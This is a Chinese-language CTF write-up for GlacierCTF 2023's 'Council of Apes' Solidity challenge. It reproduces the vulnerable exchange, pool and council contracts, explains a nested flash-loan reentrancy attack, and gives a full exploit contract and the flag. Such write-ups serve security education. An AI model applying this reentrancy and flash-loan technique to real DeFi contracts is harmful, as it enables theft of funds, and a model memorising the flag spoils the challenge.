---
title: Blockchain - The Council of Apes
description: 2023 | GlacierCTF | smartcontract
tags:
    - smart contract
    - flashloan
    - reentrancy
---

## 题目

On top of the glacier you run into a bunch of monkeys. They are screaching at each other, throwin feces around and won't let you pass. You will need to somehow get rid of them to finish your mission.

> nc chall.glacierctf.com 13380

??? note "Setup.sol"

    ```js
    // SPDX-License-Identifier: MIT
    pragma solidity ^0.8.20;

    import "./IcyExchange.sol";

    contract Setup {
        IcyExchange public immutable TARGET; // Contract the player will hack
        IERC20 public monkeyToken;
        IERC20 public djungleCoin;
        bool public already_claimed;

        constructor() payable {
            // Deploy the target contract
            TARGET = new IcyExchange{value: 5 ether}();

            //Become an ape
            bytes32 holyWords = keccak256("I hereby swear to ape into every shitcoin I see, to never sell, to never surrender, to never give up, to never stop buying, to never stop hodling, to never stop aping, to never stop believing, to never stop dreaming, to never stop hoping, to never stop loving, to never stop living, to never stop breathing");
            TARGET.council().becomeAnApe(holyWords);

            // We generate 2 new tokens and deploy them at the exchange
            monkeyToken = new TotallyNotCopiedToken(address(this), "MonkeyToken", "MONK");
            djungleCoin = new TotallyNotCopiedToken(address(this), "DjungleCoin", "DJUNGLE");

            //Approve the exchange for both
            monkeyToken.approve(address(TARGET), 100_000);
            djungleCoin.approve(address(TARGET), 100_000);

            //Deploy both pools
            TARGET.createPool{value: 1 ether}(address(monkeyToken));
            TARGET.createPool{value: 1 ether}(address(djungleCoin));
        }

        //You can get 100 of each for free
        function claimFreeTokens() external
        {
            require(!already_claimed);
            monkeyToken.transfer(msg.sender, 100);
            djungleCoin.transfer(msg.sender, 100);
            already_claimed = true;
        }

        // Our challenge in the CTF framework will call this function to
        // check whether the player has solved the challenge or not.
        function isSolved() public view returns (bool) {
            return TARGET.council().isDissolved();
        }
    }
    ```

??? note "IcyExchange.sol"

    ```js
    // SPDX-License-Identifier: MIT
    pragma solidity ^0.8.20;

    import "./CouncilOfApes.sol";

    contract IcyExchange
    {
        TotallyNotCopiedToken public icyToken;
        CouncilOfApes public council;
        mapping (address => IcyPool) pools;
        mapping (address => mapping(IERC20 => uint256)) public liquidity;
        uint256 poolCounter;

        modifier onlyApe
        {
            require(council.getMemberClass(msg.sender) >= CouncilOfApes.apeClass.APE);
            _;
        }

        constructor() payable
        {
            require (msg.value == 5 ether, "You must pay 5 Ether to create the exchange");
            icyToken = new TotallyNotCopiedToken(address(this), "IcyToken", "ICY");
            council = new CouncilOfApes(address(icyToken));
        }

        //---------------------------- Public Functions ----------------------------//

        function createPool(address token) onlyApe() payable external
        {
            require(msg.value == 1 ether, "You must pay 1 Ether to create a pool");

            //Check if pool already exists
            require(address(pools[token]) == address(0), "This pool already exists");

            //Create the pool and add it to the pools mapping
            pools[token] = new IcyPool(address(icyToken), token);
            
            //Every pool needs to be initialized with 100,000 of the chosen tokens and will get 100,000 of the icyToken
            IERC20(token).transferFrom(msg.sender, address(pools[token]), 100_000);
            icyToken.transfer(address(pools[token]), 100_000);
        }

        function swap(address fromToken, address toToken, uint256 amount) onlyApe() external
        {
            require(amount > 0, "You must swap at least 1 token");

            IcyPool pool;

            if(fromToken == address(icyToken))
            {
                pool = pools[toToken];
            }
            else if (toToken == address(icyToken))
            {
                pool = pools[fromToken]; 
            }

            pool.swap(msg.sender, fromToken, toToken, amount);
        }

        //---------------------------- Lending Functions ----------------------------//

        //We offer the worlds first collateralized flash loan (even safer than anything else)
        function collateralizedFlashloan(address collateralToken, uint256 amount, address target) onlyApe() external
        {
            require(amount > 0, "You must lend out at least 1 token");
            require(amount <= icyToken.balanceOf(address(this)), "We can't lend you this much");
            require(IERC20(collateralToken).totalSupply() <= 100_000_000, "Shitcoins are not accepted");
            require(address(pools[collateralToken]) != address(0), "This pool does not exist");

            uint256 neededCollateral = pools[collateralToken].getTokensPerIcyToken(amount);
            require(neededCollateral <= 100_000_000, "Shitcoins are still not accepted, don't try to cheat us");

            //Receive the collateral
            IERC20(collateralToken).transferFrom(msg.sender, address(this), neededCollateral);

            //Flashloan happens
            icyToken.transfer(msg.sender, amount);

            //You get to do stuff
            (bool success, ) = target.call(abi.encodeWithSignature("receiveFlashLoan(uint256)", amount));
            require(success);

            //By here we should get all our money back
            icyToken.transferFrom(msg.sender, address(this), amount);

            //Return the collateral
            IERC20(collateralToken).transfer(msg.sender, neededCollateral);
        }

        //---------------------------- View Functions ----------------------------//

        function getPoolCount() public view returns (uint256)
        {
            return poolCounter;
        }

        function getPool(address token) public view returns (IcyPool)
        {
            return pools[token];
        }
    }
    ```

??? note "CouncilOfApes.sol"

    ```js
    pragma solidity ^0.8.20;

    import "./IcyPool.sol";

    contract CouncilOfApes
    {
        mapping (address => uint256) public bananaBalance;
        mapping (address => uint256) public votes;
        mapping (address => apeClass) public members;

        bool public dissolved;
        IERC20 public icyToken;
        uint256 lastVote;

        enum apeClass{
            NOBODY,
            APE,
            CHIMP,
            ORANGUTAN,
            GORILLA
        }

        modifier notDissolved
        {
            require(dissolved == false, "The council has been dissolved");
            _;
        }

        modifier onlyAlpha
        {
            require(members[msg.sender] == apeClass.GORILLA, "This function can only be called by an alpha ape");
            _;
        }

        constructor(address _icyToken)
        {
            dissolved = false;
            icyToken = IERC20(_icyToken);
            lastVote = 0;
        }

        //--------------------------- APE FUNCTIONS ---------------------------//

        //To become an ape you have to say the holy words.
        function becomeAnApe(bytes32 theHolyWords) external notDissolved
        {
            require(theHolyWords == keccak256("I hereby swear to ape into every shitcoin I see, to never sell, to never surrender, to never give up, to never stop buying, to never stop hodling, to never stop aping, to never stop believing, to never stop dreaming, to never stop hoping, to never stop loving, to never stop living, to never stop breathing"));

            //You are officially an ape now
            members[msg.sender] = apeClass.APE;

            //You get a free banana
            bananaBalance[msg.sender] = 1;
        }

        //You can also buy bananas from the apes
        function buyBanana(uint256 amount) external notDissolved() 
        {
            require(members[msg.sender] == apeClass.APE);

            icyToken.transferFrom(msg.sender, address(this), amount);
            bananaBalance[msg.sender] += amount;
        }

        //You can also get your bananas back
        function sellBanana(uint256 amount) external notDissolved()
        {
            require(bananaBalance[msg.sender] >= amount, "You don't have that many bananas");

            icyToken.transfer(msg.sender, amount);
            bananaBalance[msg.sender] -= amount;
        }

        //Every cycle the apes vote for new alphas with their bananas
        function vote(address target, uint256 amount) external
        {
            require(bananaBalance[msg.sender] >= amount, "You don't have that many bananas");
            bananaBalance[msg.sender] -= amount;
            votes[target] += amount;
        }

        //If you have enough votes, you can claim a new rank
        function claimNewRank() external
        {
            if (votes[msg.sender] >= 1_000_000_000)
            {
                members[msg.sender] = apeClass.GORILLA;
                lastVote = block.timestamp;
            }
            else if (votes[msg.sender] >= 1_000_000)
            {
                members[msg.sender] = apeClass.ORANGUTAN;
                lastVote = block.timestamp;
            } 
            else if (votes[msg.sender] >= 1_000)
            {
                members[msg.sender] = apeClass.CHIMP;
                lastVote = block.timestamp;
            } 
        }

        //--------------------------- ALPHA FUNCTIONS ---------------------------//

        //The alpha can issue himself bananas
        function issueBanana(uint256 amount, address target) external notDissolved() onlyAlpha()
        {
            require(amount > 0, "You must issue at least 1 banana");

            bananaBalance[target] += amount;
        }

        //If you are one of the alpha apes, you can dissolve the council
        function dissolveCouncilOfTheApes(bytes32 theEvilWords) external notDissolved() onlyAlpha()
        {
            require(theEvilWords == keccak256("Kevin come out of the basement, dinner is ready."));

            dissolved = true;
        }

        //--------------------------- VIEW FUNCTIONS ---------------------------//

        function getBananaBalance(address target) external view returns (uint256)
        {
            return bananaBalance[target];
        }

        function getVotes(address target) external view returns (uint256)
        {
            return votes[target];
        }

        function getMemberClass(address target) external view returns (apeClass)
        {
            return members[target];
        }

        function isDissolved() external view returns (bool)
        {
            return dissolved;
        }
    }
    ```

??? note "IcyPool.sol"

    ```js
    pragma solidity ^0.8.20;

    import "./TotallyNotCopiedToken.sol";

    contract IcyPool
    {
        address public exchange;
        IERC20 public icyToken;
        IERC20 public token2;

        modifier onlyExchange
        {
            require(msg.sender == exchange, "Only the exchange can call this function");
            _;
        }

        constructor(address icyToken_, address token2_)
        {
            icyToken = IERC20(icyToken_);
            token2 = IERC20(token2_);
            exchange = msg.sender;
        }
        //----------------------------- External Functionalities -----------------------------------------//

        function swap(address caller, address fromToken, address toToken, uint256 amount) onlyExchange external
        {
            uint256 receivedTokens = _calculateOutput(fromToken, toToken, amount);

            //Check if the pool has enough tokens to swap
            require(IERC20(toToken).balanceOf(address(this)) > receivedTokens, "The pool does not have enough tokens to swap");

            //Let the pool swap the tokens
            IERC20(fromToken).transferFrom(caller, address(this), amount);

            //Transfer the tokens back to the caller
            IERC20(toToken).transfer(caller, receivedTokens);
        }

        function getTokensPerIcyToken(uint256 amount) view external returns (uint256)
        {
            return _calculateOutput(address(icyToken), address(token2), amount);
        }

        //----------------------------- Internal Functionalities -----------------------------------------//

        function _calculateOutput(address _tokenFrom, address _tokenTo, uint256 amount) internal view returns (uint256)
        {
            uint256 balanceOfTokenFrom = IERC20(_tokenFrom).balanceOf(address(this));
            uint256 balanceOfTokenTo = IERC20(_tokenTo).balanceOf(address(this));

            uint256 returned_tokens = (amount * balanceOfTokenTo) / balanceOfTokenFrom;

            if (returned_tokens >= balanceOfTokenTo)
            {
                returned_tokens = balanceOfTokenTo - 1;
            }

            return returned_tokens;
        }
    }
    ```

??? note "TotallyNotCopiedToken.sol"

    ```js
    // SPDX-License-Identifier: MIT
    pragma solidity ^0.8.20;

    import "./libraries/ERC20.sol";

    contract TotallyNotCopiedToken is ERC20 
    {
        constructor(address owner, string memory name, string memory symbol) ERC20(name, symbol) 
        {
            _mint(owner, type(uint256).max);
        }
    }
    ```

## 解题思路

- 目标是解散 `CouncilOfApes`

    ```js
    function isSolved() public view returns (bool) {
        return TARGET.council().isDissolved();
    }
    ```

- 只有 `apeClass` 为 `GORILLA` 才能解散委员会

    ```js
    modifier onlyAlpha
    {
        require(members[msg.sender] == apeClass.GORILLA, "This function can only be called by an alpha ape");
        _;
    }

    //If you are one of the alpha apes, you can dissolve the council
    function dissolveCouncilOfTheApes(bytes32 theEvilWords) external notDissolved() onlyAlpha()
    ```

- 成为 `GORILLA` 需要 $10^9$ 票，对应 $10^9$ 根香蕉，香蕉可通过 `icyToken` 兑换。成为 `GORILLA` 之后能够获取任意数量的香蕉，而 `IcyExchange` 提供 `icyToken` 闪电贷，那么可以借助闪电贷成为 `GORILLA`，再卖掉香蕉换取 `icyToken` 归还闪电贷
- 发起闪电贷需要质押另一种代币。由于代币总发行量不能超过 $10^8$，因而不能使用 `TotallyNotCopiedToken`。但单次闪电贷的金额不足以成为 `GORILLA`，考虑到没有重入保护，可以在 `receiveFlashLoan()` 时再次发起闪电贷

    ```js
    function collateralizedFlashloan(address collateralToken, uint256 amount, address target) onlyApe() external
    {
        require(amount > 0, "You must lend out at least 1 token");
        require(amount <= icyToken.balanceOf(address(this)), "We can't lend you this much");
        require(IERC20(collateralToken).totalSupply() <= 100_000_000, "Shitcoins are not accepted");
        require(address(pools[collateralToken]) != address(0), "This pool does not exist");

        uint256 neededCollateral = pools[collateralToken].getTokensPerIcyToken(amount);
        require(neededCollateral <= 100_000_000, "Shitcoins are still not accepted, don't try to cheat us");

        //Receive the collateral
        IERC20(collateralToken).transferFrom(msg.sender, address(this), neededCollateral);

        //Flashloan happens
        icyToken.transfer(msg.sender, amount);

        //You get to do stuff
        (bool success, ) = target.call(abi.encodeWithSignature("receiveFlashLoan(uint256)", amount));
        require(success);

        //By here we should get all our money back
        icyToken.transferFrom(msg.sender, address(this), amount);

        //Return the collateral
        IERC20(collateralToken).transfer(msg.sender, neededCollateral);
    }
    ```

### Exploit

```js
contract HackToken is ERC20 {
    constructor(address owner)
        ERC20("HackToken", "HACK")
    {
        _mint(owner, 100_000_000);
    }
}

contract CouncilOfApesHack {

    IcyExchange exchange;
    CouncilOfApes council;
    TotallyNotCopiedToken icyToken;
    bytes32 theHolyWords = keccak256("I hereby swear to ape into every shitcoin I see, to never sell, to never surrender, to never give up, to never stop buying, to never stop hodling, to never stop aping, to never stop believing, to never stop dreaming, to never stop hoping, to never stop loving, to never stop living, to never stop breathing");
    bytes32 theEvilWords = keccak256("Kevin come out of the basement, dinner is ready.");

    function exploit(Setup setup) external payable {
        exchange = setup.TARGET();
        council = exchange.council();
        icyToken = exchange.icyToken();
        icyToken.approve(address(exchange), type(uint256).max);
        icyToken.approve(address(council), type(uint256).max);

        council.becomeAnApe(theHolyWords);
        setup.claimFreeTokens();
        HackToken token = new HackToken(address(this));
        token.approve(address(exchange), type(uint256).max);
        exchange.createPool{value: 1 ether}(address(token));
        exchange.collateralizedFlashloan(
            address(token),
            token.balanceOf(address(this)),
            address(this)
        );
        council.dissolveCouncilOfTheApes(theEvilWords);
    }

    function receiveFlashLoan(uint256 amount) external {
        require(msg.sender == address(exchange));
        if (icyToken.balanceOf(address(this)) < 1e9) {
            HackToken token = new HackToken(address(this));
            token.approve(address(exchange), type(uint256).max);
            exchange.createPool{value: 1 ether}(address(token));
            exchange.collateralizedFlashloan(
                address(token),
                token.balanceOf(address(this)),
                address(this)
            );
        } else {
            council.buyBanana(1e9);
            council.vote(address(this), 1e9);
            council.claimNewRank();
        }
        council.issueBanana(amount, address(this));
        uint balance = icyToken.balanceOf(address(council));
        council.sellBanana(amount > balance ? balance : amount);
    }
}
```

### Flag

> gctf{M0nkee5_4re_inD33d_t0g3ther_str0ng3r}